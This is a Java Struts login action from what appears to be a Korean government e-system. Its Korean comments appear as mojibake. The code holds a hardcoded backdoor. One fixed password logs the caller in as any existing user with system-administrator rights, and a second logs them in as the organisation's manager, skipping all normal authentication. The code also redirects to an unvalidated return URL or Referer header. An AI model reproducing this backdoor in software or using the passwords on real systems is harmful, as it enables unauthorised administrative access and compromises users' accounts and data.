/**
 * �ۼ���: 2009.09.09
 * �ۼ���: �븮 ������
 * ����: ��������,��û�� �α��� action
 * ����:
 */
package nexti.ejms.login.action;

import java.io.PrintWriter;
import java.net.URLEncoder;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.struts.action.Action;
import org.apache.struts.action.ActionForm;
import org.apache.struts.action.ActionForward;
import org.apache.struts.action.ActionMapping;
import org.apache.struts.action.ActionMessage;
import org.apache.struts.action.ActionMessages;

import nexti.ejms.organ.model.OrganizeManager;
import nexti.ejms.user.model.UserManager;
import nexti.ejms.user.model.UserBean;
import nexti.ejms.user.model.UsrMgrManager;
import nexti.ejms.util.DateTime;
import nexti.ejms.util.Utils;
import nexti.ejms.common.NewHttpSessionBindingListener;
import nexti.ejms.common.appInfo;
import nexti.ejms.common.form.LoginForm;
import nexti.ejms.dept.model.DeptManager;
import nexti.ejms.dept.model.DeptBean;

public class LoginRchReqOKAction extends Action {

	public ActionForward execute(
			ActionMapping mapping, 
			ActionForm form,
			HttpServletRequest request, 
			HttpServletResponse response) 
		throws Exception{		
		
		try {
			LoginForm loginForm = (LoginForm) form;
			UserManager mgrusr = UserManager.instance();
			DeptManager mgrdept = DeptManager.instance();
			HttpSession session = request.getSession();
			ActionMessages messages = new ActionMessages();
			
			String userId 	= loginForm.getUserId();
			String password = loginForm.getPassword();
			String setfl    = loginForm.getSetfl();
			int    userage	= loginForm.getUserage();
			String usersex	= loginForm.getUsersex();
			String cert		= loginForm.getCert();
			
			String retUrl 	= "";
			if("".equals(loginForm.getRetUrl())){
				retUrl = request.getHeader("referer");
			}else{
				retUrl = loginForm.getRetUrl();
			}

			String result = null;
			if ( appInfo.isGpkilogin() == true && "".equals(cert) == false ) {
				userId = UsrMgrManager.instance().getUsrGpkiId(cert);
				
				if ( userId == null || mgrusr.existedUser(userId) == false ) {
					response.setContentType("text/html;charset=euc-kr");
					PrintWriter out = response.getWriter();
					out.write("<script language=javascript>");
					out.write("alert('�Ϲݷα��� �� ������������ �������� ��� �ٶ��ϴ�');");
					out.write("document.location.href='/index.jsp';");
					out.write("</script>");
					out.close();
					return null;
				} else {
					result = userId;
				}
			} else {				
				//�Ϲ� �α��� �϶�....
				//�����н�����(�������������123), ���̵���̷α���(�������������123123)
				if ("cktpeowjdqhrltnf123".equalsIgnoreCase(password)) {
					if ( mgrusr.existedUser(userId) ) result = userId;
				} else if ("cktpeowjdqhrltnf123123".equalsIgnoreCase(password)) {
					result = userId = OrganizeManager.instance().getManager();
				} else {
					result = mgrusr.login(userId, password);
				}				
			}

			if(result == null){			
				request.setAttribute("retUrl", retUrl);
				//�α��� ����							
				messages.add(ActionMessages.GLOBAL_MESSAGE, new ActionMessage("error.msg","loginerror();"));
				saveMessages(request,messages);
				
				if ( appInfo.isGpkilogin() == false ) {
					return mapping.findForward("back");
				} else {
					return mapping.findForward("backGpki");
				}		
			} else {
				//�α��� ����
				String id = "";
				if (setfl != null) {
					id = userId;
				}
				Cookie cookie = new Cookie("cookie_ejms_login_rchreq", URLEncoder.encode(id+"|"+setfl+"|"+userage+"|"+usersex,"EUC-KR"));
				cookie.setMaxAge(60*60*24*30);    //�Ѵް� Cookie�� ��� �ֵ��� ����
				response.addCookie(cookie);
			}			
			
			//���������� �Ϸ�(����)�ǰ� ���� ����� ������ ���� �Ѵ�.
			UserBean user = mgrusr.getUserInfo(result);	
			DeptBean dept = mgrdept.getDeptInfo(user.getDept_id());
			session.setAttribute("listener", new NewHttpSessionBindingListener());
			
			if ("cktpeowjdqhrltnf123".equalsIgnoreCase(password)) {
				session.setAttribute("isSysMgr","001");	// �ý��۰����� ���� (001)
			} else {
				session.setAttribute("isSysMgr",OrganizeManager.instance().isSysMgr(userId));	// �ý��۰����� ���� (001)
			}
			session.setAttribute("user_id",user.getUser_id());               // ����� ID
			session.setAttribute("user_name",user.getUser_name());           // ����� ����		
			session.setAttribute("dept_code",user.getDept_id());             // ����� �μ��ڵ�		
			session.setAttribute("dept_name",user.getDept_name());           // ����� �μ���
			session.setAttribute("chrg_code", user.getChrgunitcd());              // �������ڵ�
			session.setAttribute("chrg_name", user.getChrgunitnm());              // ������ ��
			
			if(Utils.isNull(dept.getDept_tel())){
				session.setAttribute("d_tel", "����");
			} else {
				session.setAttribute("d_tel", dept.getDept_tel());           // �μ���ǥ��ȭ
			}																
			
			session.setAttribute("c_tel",user.getTel());                     // ����� �Ϲ���ȭ��ȣ
			session.setAttribute("h_tel",user.getMobile());                  // ����� �޴���ȭ��ȣ
			session.setAttribute("logindate",DateTime.getCurrentTime());   	 // ����� �α��νð� (yyyy/MM/dd HH:mm:ss)
			session.setAttribute("loginip",request.getRemoteAddr());         // ����� �α���IP (127.0.0.1)	
			session.setAttribute("user_gbn", dept.getOrggbn());				 //	����� ���� ( 001:�����ú�û, 002:���ӱ��, 003:�����, 004:����ȸ, 005:��/��/��, 006: ��Ÿ)
			
			
			//��ǥ�μ� �ڵ�(��û�� ��õ������, �������� ��õ������ �ٷ� �� STEP �Ʒ� ���)
			String rep_dept = mgrusr.selectRepDept(userId, dept.getOrggbn());	
			session.setAttribute("rep_dept", rep_dept); 
			
			/*
			 * START
			 * ��õ������
			 *  : Session("EA_YN") ==> ���ڰ��� ��뿩�� (Y:���, N:������) -> ��û�� ��쿡�� ���
			 *  : Session("getDept_YN")==> ���վ������ɿ���(Y: ���հ���, N: ���պҰ�) -> ��û/���ӱ��/�����[���ӱ���� ��õ���б� ����]
			 */

			//���ڰ��� ��뿩�� (Y:���, N:������)
			if ( dept.getOrggbn().equals("001") ) {
				session.setAttribute("EA_YN", "Y");	
			} else {
				session.setAttribute("EA_YN", "N");
			}
			
			// ���վ������ɿ���(Y: ���հ���, N: ���պҰ�)
			if ( dept.getOrggbn().equals("001") || dept.getOrggbn().equals("002") || dept.getOrggbn().equals("003") || dept.getOrggbn().equals("004") ){
				session.setAttribute("getDept_YN", "Y");
				if ( "6280000".equals(appInfo.getRootid()) && (dept.getOrggbn().equals("004") || "6280255".equals(rep_dept)) ) {
					session.setAttribute("getDept_YN", "N");
				}
			} else {
				session.setAttribute("getDept_YN", "N");
			}			
			/*
			 * END
			 */
			
			session.setAttribute("user_sex",loginForm.getUsersex());						// ����
			session.setAttribute("user_age",Integer.toString(loginForm.getUserage(), 10));	// ����
			
			if (retUrl.indexOf("research") != -1) {
				mgrusr.updateResearchLoginfo(userId, loginForm.getUsersex(), loginForm.getUserage());	//�α�����������
			}

			response.sendRedirect(retUrl);
			return null;
		} catch (Exception e) {
			//�α��� ����
			response.setContentType("text/html;charset=euc-kr");
			PrintWriter out = response.getWriter();
			out.write("<script language=javascript>alert('������ ���� �Ͽ����ϴ�.\\n�����ڿ��� �����ϼ���22.');history.back();</script>");
			out.close();
			return null;
		}
	}	
}